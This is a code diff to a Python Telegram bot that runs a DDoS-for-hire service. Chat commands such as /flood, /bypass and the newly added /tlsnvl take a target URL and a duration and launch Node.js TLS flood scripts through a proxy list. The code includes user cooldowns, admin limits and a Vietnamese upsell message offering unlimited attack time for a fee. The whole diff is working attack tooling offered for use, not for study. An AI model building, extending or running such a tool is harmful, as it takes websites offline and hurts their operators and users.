@@ -43,10 +43,12 @@ async def run_attack(url, attack_time, update, method, context):
     
     user_id = update.effective_user.id
     heap_size = "--max-old-space-size=8192"
+    
+    # Thêm phương thức tls-nvl.js vào đây
     commands = {
-        'tls': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt",
-        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt bypass",
-        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt flood"
+        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt bypass",
+        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 10 10 live.txt flood",
+        'tls-nvl': f"node {heap_size} tls-nvl.js {url} {attack_time} 10 10 live.txt"  # Thêm lệnh tấn công mới
     }
 
     command = commands.get(method)
@@ -59,6 +61,7 @@ async def run_attack(url, attack_time, update, method, context):
         "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
         "message": None
     })
+
 
 
     history = load_json(HISTORY_FILE)
@@ -104,40 +107,37 @@ user_last_command_time = {}
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
     
     if not is_bot_on():
         return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
     
-    
     if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(user_id):
         return await update.message.reply_text("❌ Bạn không có quyền sử dụng tính năng này. Muốn build server bot riêng hoặc mở không giới hạn slot time, liên hệ @neverlose102.")
 
-    
     if not is_admin(user_id):  
         current_time = time.time()  
         last_time = user_last_command_time.get(user_id, 0)  
 
         if current_time - last_time < 60:
             remaining_time = 60 - (current_time - last_time)
-           
             return await update.message.reply_text(f"❌ @{update.effective_user.username}, bạn cần chờ thêm {int(remaining_time)} giây nữa mới có thể thực hiện lệnh tiếp theo.")
 
-      
         user_last_command_time[user_id] = current_time
-
     
     if len(context.args) < 2:
         return await help_command(update, context)
 
     try:
         url, attack_time = context.args[0], int(context.args[1])
-        method = 'STRONGS-CF' if '/strongscf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')
-
         
+        # Chỉ giữ lại phương thức 'tls-nvl' và 'flood'
+        if '/tlsnvl' in update.message.text:
+            method = 'tls-nvl'
+        else:
+            method = 'flood'
+
         if attack_time > 60 and not is_admin(update.effective_user.id):
             return await update.message.reply_text("⚠️ Thời gian tối đa là 60 giây.")
-        
         
         asyncio.create_task(run_attack(url, attack_time, update, method, context))
 
@@ -297,7 +297,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ### User Commands:
 - /flood https://google.com 60 - Flood attack for 60 seconds.
 - /bypass https://google.com 60 - Bypass attack for 60 seconds.
-- /tls https://google.com 60 - TLS attack for 60 seconds
+- /tlsnvl https://google.com 60 - NVL attack for 60 seconds.
 - /help - Show command guide.
 
 ### Admin Commands:
@@ -318,7 +318,7 @@ def main():
     application = ApplicationBuilder().token(TOKEN).build()
     application.add_handler(CommandHandler("flood", attack))
     application.add_handler(CommandHandler("bypass", attack))
-    application.add_handler(CommandHandler("tls", attack))
+    application.add_handler(CommandHandler("tlsnvl", attack))  # Thêm dòng này để đăng ký lệnh tlsnvl
     application.add_handler(CommandHandler("stop", stop))
     application.add_handler(CommandHandler("addgroup", add_group))
     application.add_handler(CommandHandler("adduser", add_user_admin))
